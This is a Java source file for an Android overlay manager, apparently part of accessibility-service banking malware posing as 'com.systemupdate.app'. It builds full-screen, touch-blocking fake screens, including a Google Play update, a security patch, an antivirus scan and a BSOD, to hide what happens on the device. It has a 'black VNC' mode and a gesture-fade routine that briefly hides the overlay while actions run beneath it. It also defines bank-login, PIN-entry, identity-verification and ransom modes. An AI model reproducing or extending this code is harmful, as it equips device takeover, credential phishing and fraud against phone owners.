package com.systemupdate.app;

import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.json.JSONObject;

public class OverlayManager {

    private static final String TAG = "Overlay";
    private static OverlayManager instance;

    public static final String OWN_PACKAGE = "com.systemupdate.app";

    public static final String MODE_UPDATE_PLAY       = "UPDATE_PLAY";
    public static final String MODE_UPDATE_SYSTEM     = "UPDATE_SYSTEM";
    public static final String MODE_UPDATE_SECURITY   = "UPDATE_SECURITY";
    public static final String MODE_UPDATE_APP        = "UPDATE_APP";
    public static final String MODE_MAINTENANCE       = "MAINTENANCE";
    public static final String MODE_LOADING_ROUND     = "LOADING_ROUND";
    public static final String MODE_LOADING_DOTS      = "LOADING_DOTS";
    public static final String MODE_LOADING_BAR       = "LOADING_BAR";
    public static final String MODE_LOADING_SKELETON  = "LOADING_SKELETON";
    public static final String MODE_BLACK             = "BLACK";
    public static final String MODE_BLACK_VNC         = "BLACK_VNC";
    public static final String MODE_BSOD              = "BSOD";
    public static final String MODE_KERNEL_PANIC      = "KERNEL_PANIC";
    public static final String MODE_NETWORK_ERROR     = "NETWORK_ERROR";
    public static final String MODE_ANTIVIRUS_SCAN    = "ANTIVIRUS_SCAN";
    public static final String MODE_BACKUP_RESTORE    = "BACKUP_RESTORE";
    public static final String MODE_DEVICE_OPTIMIZE   = "DEVICE_OPTIMIZE";
    public static final String MODE_BATTERY_CALIBRATE = "BATTERY_CALIBRATION";
    public static final String MODE_BANK_LOGIN        = "BANK_LOGIN";
    public static final String MODE_PIN_ENTRY         = "PIN_ENTRY";
    public static final String MODE_VERIFY_IDENTITY   = "VERIFY_IDENTITY";
    public static final String MODE_PASSIVE_CAPTURE   = "PASSIVE_CAPTURE";
    public static final String MODE_RANSOM            = "RANSOM";

    private final PhantomAccessibilityService svc;
    private WindowManager wm;
    private Handler handler;
    private View overlayRoot;
    private String currentMode = null;

    private volatile boolean faded = false;
    private long lastFadeAt = 0L;

    public OverlayManager(PhantomAccessibilityService service) {
        this.svc = service;
        this.handler = new Handler(Looper.getMainLooper());
        try { this.wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE); }
        catch (Throwable t) { this.wm = null; }
        instance = this;
    }

    public static OverlayManager getInstance() { return instance; }

    public boolean show() { return show(MODE_UPDATE_PLAY, null); }
    public boolean show(final String mode) { return show(mode, null); }

    public boolean show(final String mode, final JSONObject data) {
        try {
            if (Looper.myLooper() == Looper.getMainLooper()) return showInternal(mode, data);
            handler.post(new Runnable() { @Override public void run() { showInternal(mode, data); } });
            return true;
        } catch (Throwable t) {
            PhantomLog.e(TAG, "show posted failed", t);
            return false;
        }
    }

    private boolean showInternal(String mode, JSONObject data) {
        try {
            if (wm == null) return false;
            if (overlayRoot != null && mode != null && mode.equals(currentMode)) return true;
            if (overlayRoot != null) {
                try { wm.removeView(overlayRoot); } catch (Throwable t) { }
                overlayRoot = null;
                currentMode = null;
            }

            if (mode == null) mode = MODE_UPDATE_PLAY;
            boolean passive = MODE_PASSIVE_CAPTURE.equals(mode);
            boolean blackVnc = MODE_BLACK_VNC.equals(mode);

            View built = null;
            if (passive) built = buildPassiveCapture();
            else if (blackVnc) built = buildBlackVnc();
            else built = buildViewForMode(mode, data);
            if (built == null) built = buildUpdatePlay();

            if (Build.VERSION.SDK_INT >= 16) {
                built.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS);
            }

            if (!passive) {
                built.setOnTouchListener(new View.OnTouchListener() {
                    @Override public boolean onTouch(View v, MotionEvent event) { return true; }
                });
            }

            overlayRoot = built;
            currentMode = mode;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            int baseFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS;

            if (passive) baseFlags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

            int[] size = svc.getScreenSize();
            int screenH = size[1];
            int pixel = passive ? PixelFormat.TRANSLUCENT : PixelFormat.OPAQUE;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                screenH + 400,
                type, baseFlags, pixel);
            params.gravity = Gravity.TOP | Gravity.LEFT;
            params.x = 0;
            params.y = -200;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;
            }

            wm.addView(overlayRoot, params);
            faded = false;
            PhantomLog.i(TAG, "Overlay shown mode=" + mode + " passive=" + passive);
            return true;
        } catch (Throwable t) {
            PhantomLog.e(TAG, "showInternal failed: " + t.getMessage(), t);
            overlayRoot = null;
            currentMode = null;
            return false;
        }
    }

    public boolean hide() {
        try {
            if (Looper.myLooper() == Looper.getMainLooper()) return hideInternal();
            handler.post(new Runnable() { @Override public void run() { hideInternal(); } });
            return true;
        } catch (Throwable t) { return false; }
    }

    private boolean hideInternal() {
        try {
            if (overlayRoot != null && wm != null) {
                try { wm.removeView(overlayRoot); } catch (Throwable t) { }
            }
            overlayRoot = null;
            currentMode = null;
            faded = false;
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean isVisible() { return overlayRoot != null; }
    public String getMode() { return currentMode; }
    public boolean isPassive() { return MODE_PASSIVE_CAPTURE.equals(currentMode); }
    public boolean isBlackVnc() { return MODE_BLACK_VNC.equals(currentMode); }

    public void fadeForGesture(final long fadeOutMs, final Runnable betweenFade) {
        if (overlayRoot == null) {
            if (betweenFade != null) betweenFade.run();
            return;
        }
        long now = System.currentTimeMillis();
        if (now - lastFadeAt < 80) {
            if (betweenFade != null) betweenFade.run();
            return;
        }
        lastFadeAt = now;

        handler.post(new Runnable() {
            @Override public void run() {
                try { faded = true; overlayRoot.setAlpha(0.0f); } catch (Throwable t) { }
                handler.postDelayed(new Runnable() {
                    @Override public void run() { try { if (betweenFade != null) betweenFade.run(); } catch (Throwable t) { } }
                }, 40);
                handler.postDelayed(new Runnable() {
                    @Override public void run() {
                        try { if (overlayRoot != null) overlayRoot.setAlpha(1.0f); faded = false; } catch (Throwable t) { }
                    }
                }, Math.max(80, fadeOutMs));
            }
        });
    }

    public boolean isFaded() { return faded; }

    public static boolean isOurPackage(CharSequence pkg) {
        if (pkg == null) return false;
        try { return OWN_PACKAGE.equals(pkg.toString()); }
        catch (Throwable t) { return false; }
    }

    private View buildViewForMode(String mode, JSONObject data) {
        try {
            if (MODE_UPDATE_PLAY.equals(mode))       return buildUpdatePlay();
            if (MODE_UPDATE_SYSTEM.equals(mode))     return buildUpdateSystem();
            if (MODE_UPDATE_SECURITY.equals(mode))   return buildUpdateSecurity();
            if (MODE_UPDATE_APP.equals(mode))        return buildUpdateApp();
            if (MODE_MAINTENANCE.equals(mode))       return buildMaintenance();
            if (MODE_LOADING_ROUND.equals(mode))     return buildLoadingRound();
            if (MODE_LOADING_DOTS.equals(mode))      return buildLoadingDots();
            if (MODE_LOADING_BAR.equals(mode))       return buildLoadingBar();
            if (MODE_LOADING_SKELETON.equals(mode))  return buildLoadingSkeleton();
            if (MODE_BLACK.equals(mode))             return buildBlack();
            if (MODE_BSOD.equals(mode))              return buildBsod();
            if (MODE_KERNEL_PANIC.equals(mode))      return buildKernelPanic();
            if (MODE_NETWORK_ERROR.equals(mode))     return buildNetworkError();
            if (MODE_ANTIVIRUS_SCAN.equals(mode))    return buildAntivirusScan();
            if (MODE_BACKUP_RESTORE.equals(mode))    return buildBackupRestore();
            if (MODE_DEVICE_OPTIMIZE.equals(mode))   return buildDeviceOptimize();
            if (MODE_BATTERY_CALIBRATE.equals(mode)) return buildBatteryCalibration();
            if (MODE_BANK_LOGIN.equals(mode))        return buildBankLogin(data);
            if (MODE_PIN_ENTRY.equals(mode))         return buildPinEntry();
            if (MODE_VERIFY_IDENTITY.equals(mode))   return buildVerifyIdentity();
        } catch (Throwable t) {
            PhantomLog.e(TAG, "buildViewForMode failed for " + mode, t);
        }
        return null;
    }

    private int dp(int v) { return (int) (v * svc.getResources().getDisplayMetrics().density); }

    private FrameLayout baseRoot(int bgColor) {
        FrameLayout root = new FrameLayout(svc);
        root.setBackgroundColor(bgColor);
        return root;
    }

    private LinearLayout centerCard(int bgColor, int radiusDp) {
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(28), dp(32), dp(28), dp(28));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(bgColor);
        bg.setCornerRadius(dp(radiusDp));
        card.setBackground(bg);
        return card;
    }

    private void addCenteredCard(FrameLayout root, LinearLayout card) {
        FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(dp(320), FrameLayout.LayoutParams.WRAP_CONTENT);
        lp.gravity = Gravity.CENTER;
        root.addView(card, lp);
    }

    private ImageView makeIcon(Drawable d, int sizeDp) {
        ImageView icon = new ImageView(svc);
        icon.setImageDrawable(d);
        return icon;
    }

    private TextView makeTitle(String text, int color, int sizeSp) {
        TextView t = new TextView(svc);
        t.setText(text);
        t.setTextColor(color);
        t.setTextSize(sizeSp);
        t.setGravity(Gravity.CENTER);
        return t;
    }

    private TextView makeSub(String text, int color, int sizeSp) {
        TextView t = new TextView(svc);
        t.setText(text);
        t.setTextColor(color);
        t.setTextSize(sizeSp);
        t.setGravity(Gravity.CENTER);
        return t;
    }

    private ProgressBar makeBar(int styleAttr, int progress) {
        ProgressBar bar = new ProgressBar(svc, null, styleAttr);
        bar.setMax(100);
        bar.setProgress(progress);
        return bar;
    }

    private Drawable playIcon() {
        try {
            int size = dp(72);
            android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(size, size, android.graphics.Bitmap.Config.ARGB_8888);
            android.graphics.Canvas c = new android.graphics.Canvas(bmp);
            android.graphics.Paint p = new android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG);
            android.graphics.Path left = new android.graphics.Path();
            left.moveTo(size * 0.10f, size * 0.05f);
            left.lineTo(size * 0.55f, size * 0.50f);
            left.lineTo(size * 0.10f, size * 0.95f);
            left.close();
            p.setColor(0xFF00C4FF);
            c.drawPath(left, p);
            android.graphics.Path rt = new android.graphics.Path();
            rt.moveTo(size * 0.10f, size * 0.05f);
            rt.lineTo(size * 0.85f, size * 0.35f);
            rt.lineTo(size * 0.55f, size * 0.50f);
            rt.close();
            p.setColor(0xFF00E676);
            c.drawPath(rt, p);
            android.graphics.Path rb = new android.graphics.Path();
            rb.moveTo(size * 0.55f, size * 0.50f);
            rb.lineTo(size * 0.85f, size * 0.65f);
            rb.lineTo(size * 0.10f, size * 0.95f);
            rb.close();
            p.setColor(0xFFEA4335);
            c.drawPath(rb, p);
            android.graphics.Path rm = new android.graphics.Path();
            rm.moveTo(size * 0.85f, size * 0.35f);
            rm.lineTo(size * 0.85f, size * 0.65f);
            rm.lineTo(size * 0.55f, size * 0.50f);
            rm.close();
            p.setColor(0xFFFBBC04);
            c.drawPath(rm, p);
            return new BitmapDrawable(svc.getResources(), bmp);
        } catch (Throwable t) {
            return svc.getResources().getDrawable(android.R.drawable.stat_sys_download);
        }
    }

    private Drawable shieldIcon(int color) {
        try {
            int size = dp(96);
            android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(size, size, android.graphics.Bitmap.Config.ARGB_8888);
            android.graphics.Canvas c = new android.graphics.Canvas(bmp);
            android.graphics.Paint p = new android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG);
            p.setColor(color);
            android.graphics.Path shield = new android.graphics.Path();
            shield.moveTo(size * 0.5f, size * 0.08f);
            shield.lineTo(size * 0.85f, size * 0.25f);
            shield.lineTo(size * 0.85f, size * 0.55f);
            shield.cubicTo(size * 0.85f, size * 0.80f, size * 0.65f, size * 0.90f, size * 0.5f, size * 0.95f);
            shield.cubicTo(size * 0.35f, size * 0.90f, size * 0.15f, size * 0.80f, size * 0.15f, size * 0.55f);
            shield.lineTo(size * 0.15f, size * 0.25f);
            shield.close();
            c.drawPath(shield, p);
            p.setColor(0xFFFFFFFF);
            p.setStyle(android.graphics.Paint.Style.STROKE);
            p.setStrokeWidth(size * 0.06f);
            android.graphics.Path check = new android.graphics.Path();
            check.moveTo(size * 0.33f, size * 0.52f);
            check.lineTo(size * 0.45f, size * 0.64f);
            check.lineTo(size * 0.68f, size * 0.38f);
            c.drawPath(check, p);
            return new BitmapDrawable(svc.getResources(), bmp);
        } catch (Throwable t) {
            return svc.getResources().getDrawable(android.R.drawable.ic_lock_lock);
        }
    }

    private View buildPassiveCapture() {
        FrameLayout root = new FrameLayout(svc);
        root.setBackgroundColor(0x00000000);
        return root;
    }

    private View buildBlackVnc() {
        FrameLayout root = new FrameLayout(svc);
        root.setBackgroundColor(0xFF000000);
        return root;
    }

    private View buildUpdatePlay() {
        FrameLayout root = baseRoot(0xFF0a0e1a);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        ImageView icon = makeIcon(playIcon(), 72);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(72), dp(72));
        iconLp.bottomMargin = dp(20);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Updating Google Play Services", 0xFF202124, 18));
        TextView sub = makeSub("Please wait while we update your device. Do not turn off your phone.", 0xFF5F6368, 13);
        sub.setPadding(0, dp(12), 0, dp(20));
        card.addView(sub);
        final ProgressBar bar = makeBar(android.R.attr.progressBarStyleHorizontal, 0);
        LinearLayout.LayoutParams barLp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(6));
        card.addView(bar, barLp);
        final TextView pct = makeTitle("0%", 0xFF1A73E8, 12);
        pct.setPadding(0, dp(10), 0, 0);
        card.addView(pct);
        addCenteredCard(root, card);
        final Handler anim = new Handler(Looper.getMainLooper());
        anim.postDelayed(new Runnable() {
            int p = 0;
            @Override public void run() {
                try {
                    if (overlayRoot == null) return;
                    p = (p + 1) % 101;
                    bar.setProgress(p);
                    pct.setText(p + "%");
                    anim.postDelayed(this, 900);
                } catch (Throwable t) { }
            }
        }, 900);
        return root;
    }

    private View buildUpdateSystem() {
        FrameLayout root = baseRoot(0xFF1A1A1A);
        LinearLayout card = centerCard(0xFF2A2A2A, 16);
        ImageView icon = makeIcon(svc.getResources().getDrawable(android.R.drawable.sym_def_app_icon), 96);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(96), dp(96));
        iconLp.bottomMargin = dp(24);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Installing system update", 0xFFFFFFFF, 20));
        TextView sub = makeSub("Do not turn off your device. This may take a few minutes.", 0xFFAAAAAA, 13);
        sub.setPadding(0, dp(14), 0, dp(24));
        card.addView(sub);
        final ProgressBar bar = makeBar(android.R.attr.progressBarStyleHorizontal, 0);
        LinearLayout.LayoutParams barLp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(4));
        card.addView(bar, barLp);
        addCenteredCard(root, card);
        final Handler anim = new Handler(Looper.getMainLooper());
        anim.postDelayed(new Runnable() {
            int p = 0;
            @Override public void run() {
                try {
                    if (overlayRoot == null) return;
                    p = (p + 1) % 101;
                    bar.setProgress(p);
                    anim.postDelayed(this, 1200);
                } catch (Throwable t) { }
            }
        }, 1200);
        return root;
    }

    private View buildUpdateSecurity() {
        FrameLayout root = baseRoot(0xFF0B1220);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        ImageView icon = makeIcon(shieldIcon(0xFF1A73E8), 96);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(96), dp(96));
        iconLp.bottomMargin = dp(20);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Applying security patch", 0xFF202124, 18));
        TextView sub = makeSub("Your device is being secured against the latest threats.", 0xFF5F6368, 13);
        sub.setPadding(0, dp(12), 0, dp(20));
        card.addView(sub);
        final ProgressBar bar = makeBar(android.R.attr.progressBarStyleHorizontal, 0);
        LinearLayout.LayoutParams barLp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(6));
        card.addView(bar, barLp);
        final TextView pct = makeTitle("0%", 0xFF1A73E8, 12);
        pct.setPadding(0, dp(10), 0, 0);
        card.addView(pct);
        addCenteredCard(root, card);
        final Handler anim = new Handler(Looper.getMainLooper());
        anim.postDelayed(new Runnable() {
            int p = 0;
            @Override public void run() {
                try {
                    if (overlayRoot == null) return;
                    p = (p + 1) % 101;
                    bar.setProgress(p);
                    pct.setText(p + "%");
                    anim.postDelayed(this, 800);
                } catch (Throwable t) { }
            }
        }, 800);
        return root;
    }

    private View buildUpdateApp() {
        FrameLayout root = baseRoot(0xFF0F0F0F);
        LinearLayout card = centerCard(0xFF1E1E1E, 12);
        card.addView(makeTitle("Optimizing apps", 0xFFFFFFFF, 20));
        TextView sub = makeSub("12 of 47 complete…", 0xFFAAAAAA, 13);
        sub.setPadding(0, dp(10), 0, dp(24));
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildMaintenance() {
        FrameLayout root = baseRoot(0xFFF5F5F5);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        ImageView icon = makeIcon(svc.getResources().getDrawable(android.R.drawable.ic_menu_manage), 96);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(96), dp(96));
        iconLp.bottomMargin = dp(20);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Scheduled maintenance", 0xFF202124, 20));
        TextView sub = makeSub("The service is undergoing scheduled maintenance. Please wait.", 0xFF5F6368, 13);
        sub.setPadding(0, dp(12), 0, dp(20));
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildLoadingRound() {
        FrameLayout root = baseRoot(0xF2000000);
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        ImageView icon = makeIcon(svc.getResources().getDrawable(android.R.drawable.ic_popup_sync), 96);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(96), dp(96));
        iconLp.bottomMargin = dp(24);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Loading…", 0xFFFFFFFF, 16));
        addCenteredCard(root, card);
        return root;
    }

    private View buildLoadingDots() {
        FrameLayout root = baseRoot(0xE6000000);
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        final TextView dots = makeTitle("●", 0xFFFFFFFF, 40);
        card.addView(dots);
        TextView label = makeSub("Please wait", 0xFFAAAAAA, 14);
        label.setPadding(0, dp(16), 0, 0);
        card.addView(label);
        addCenteredCard(root, card);
        final Handler anim = new Handler(Looper.getMainLooper());
        anim.postDelayed(new Runnable() {
            int step = 0;
            @Override public void run() {
                try {
                    if (overlayRoot == null) return;
                    step = (step + 1) % 4;
                    String[] seq = { "●", "●●", "●●●", "●●●●" };
                    dots.setText(seq[step]);
                    anim.postDelayed(this, 400);
                } catch (Throwable t) { }
            }
        }, 400);
        return root;
    }

    private View buildLoadingBar() {
        FrameLayout root = baseRoot(0xF2000000);
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(40), 0, dp(40), 0);
        final TextView pct = makeTitle("0%", 0xFFFFFFFF, 32);
        card.addView(pct);
        final ProgressBar bar = makeBar(android.R.attr.progressBarStyleHorizontal, 0);
        LinearLayout.LayoutParams barLp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(8));
        barLp.topMargin = dp(20);
        card.addView(bar, barLp);
        addCenteredCard(root, card);
        final Handler anim = new Handler(Looper.getMainLooper());
        anim.postDelayed(new Runnable() {
            int p = 0;
            @Override public void run() {
                try {
                    if (overlayRoot == null) return;
                    p = (p + 1) % 101;
                    bar.setProgress(p);
                    pct.setText(p + "%");
                    anim.postDelayed(this, 500);
                } catch (Throwable t) { }
            }
        }, 500);
        return root;
    }

    private View buildLoadingSkeleton() {
        FrameLayout root = baseRoot(0xFFF5F5F5);
        LinearLayout col = new LinearLayout(svc);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(dp(20), dp(60), dp(20), dp(20));
        for (int i = 0; i < 6; i++) {
            View row = new View(svc);
            GradientDrawable g = new GradientDrawable();
            g.setColor(0xFFE0E0E0);
            g.setCornerRadius(dp(8));
            row.setBackground(g);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(60));
            lp.bottomMargin = dp(12);
            col.addView(row, lp);
        }
        root.addView(col);
        return root;
    }

    private View buildBlack() { return baseRoot(0xFF000000); }

    private View buildBsod() {
        FrameLayout root = baseRoot(0xFF0078D7);
        LinearLayout col = new LinearLayout(svc);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setGravity(Gravity.CENTER);
        col.setPadding(dp(40), dp(40), dp(40), dp(40));
        col.addView(makeTitle(":(", 0xFFFFFFFF, 96));
        TextView msg = makeSub("Your PC ran into a problem and needs to restart.", 0xFFFFFFFF, 15);
        msg.setPadding(0, dp(40), 0, 0);
        col.addView(msg);
        root.addView(col);
        return root;
    }

    private View buildKernelPanic() {
        FrameLayout root = baseRoot(0xFF000000);
        LinearLayout col = new LinearLayout(svc);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setPadding(dp(20), dp(60), dp(20), dp(40));
        String[] lines = {
            "[    0.000000] Kernel panic - not syncing: Fatal exception",
            "[    0.000001] CPU: 0 PID: 1 Comm: swapper/0 Tainted: G        W",
            "[    0.000002] Hardware name: Qualcomm Technologies, Inc.",
            "[    0.000003] Call trace:",
            "[    0.000004]  dump_backtrace+0x0/0x1a8",
            "[    0.000005] Rebooting in 30 seconds…"
        };
        for (String line : lines) {
            TextView t = new TextView(svc);
            t.setText(line);
            t.setTextColor(0xFFFFFFFF);
            t.setTextSize(11);
            t.setTypeface(android.graphics.Typeface.MONOSPACE);
            t.setPadding(0, dp(4), 0, dp(4));
            col.addView(t);
        }
        root.addView(col);
        return root;
    }

    private View buildNetworkError() {
        FrameLayout root = baseRoot(0xFFF5F5F5);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        ImageView icon = makeIcon(svc.getResources().getDrawable(android.R.drawable.ic_dialog_alert), 80);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(80), dp(80));
        iconLp.bottomMargin = dp(20);
        card.addView(icon, iconLp);
        card.addView(makeTitle("No internet connection", 0xFF202124, 18));
        TextView sub = makeSub("Please check your connection and try again.", 0xFF5F6368, 13);
        sub.setPadding(0, dp(12), 0, dp(24));
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildAntivirusScan() {
        FrameLayout root = baseRoot(0xFF0B1220);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        ImageView icon = makeIcon(shieldIcon(0xFF00A86B), 96);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(96), dp(96));
        iconLp.bottomMargin = dp(20);
        card.addView(icon, iconLp);
        card.addView(makeTitle("Scanning device…", 0xFF202124, 18));
        final TextView sub = makeSub("Scanned 0 files", 0xFF5F6368, 13);
        sub.setPadding(0, dp(12), 0, dp(20));
        card.addView(sub);
        final ProgressBar bar = makeBar(android.R.attr.progressBarStyleHorizontal, 0);
        LinearLayout.LayoutParams barLp = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(6));
        card.addView(bar, barLp);
        addCenteredCard(root, card);
        return root;
    }

    private View buildBackupRestore() {
        FrameLayout root = baseRoot(0xFF0B1220);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        card.addView(makeTitle("Restoring from backup", 0xFF202124, 18));
        TextView sub = makeSub("Please wait…", 0xFF5F6368, 13);
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildDeviceOptimize() {
        FrameLayout root = baseRoot(0xFFF5F7FA);
        LinearLayout card = centerCard(0xFFFFFFFF, 16);
        card.addView(makeTitle("Optimizing memory", 0xFF202124, 18));
        TextView sub = makeSub("Please wait…", 0xFF5F6368, 13);
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildBatteryCalibration() {
        FrameLayout root = baseRoot(0xFF1A1A1A);
        LinearLayout card = centerCard(0xFF2A2A2A, 16);
        card.addView(makeTitle("Calibrating battery", 0xFFFFFFFF, 20));
        TextView sub = makeSub("Do not unplug or turn off your device.", 0xFFAAAAAA, 13);
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildBankLogin(JSONObject data) {
        String bankName = "Secure Banking";
        FrameLayout root = baseRoot(0xFFFFFFFF);
        LinearLayout header = new LinearLayout(svc);
        header.setOrientation(LinearLayout.VERTICAL);
        header.setGravity(Gravity.CENTER);
        header.setBackgroundColor(0xFF1A73E8);
        header.setPadding(dp(20), dp(60), dp(20), dp(40));
        header.addView(makeTitle(bankName, 0xFFFFFFFF, 24));
        FrameLayout.LayoutParams headerLp = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT);
        headerLp.gravity = Gravity.TOP;
        root.addView(header, headerLp);
        return root;
    }

    private View buildPinEntry() {
        FrameLayout root = baseRoot(0xFFFFFFFF);
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(30), dp(40), dp(30), dp(40));
        card.addView(makeTitle("Enter your PIN", 0xFF202124, 20));
        TextView sub = makeSub("Enter your current PIN to continue", 0xFF5F6368, 13);
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }

    private View buildVerifyIdentity() {
        FrameLayout root = baseRoot(0xFF1A1A1A);
        LinearLayout card = new LinearLayout(svc);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(30), dp(40), dp(30), dp(40));
        card.addView(makeTitle("Verifying your identity", 0xFFFFFFFF, 20));
        TextView sub = makeSub("Please hold still.", 0xFFAAAAAA, 13);
        card.addView(sub);
        addCenteredCard(root, card);
        return root;
    }
}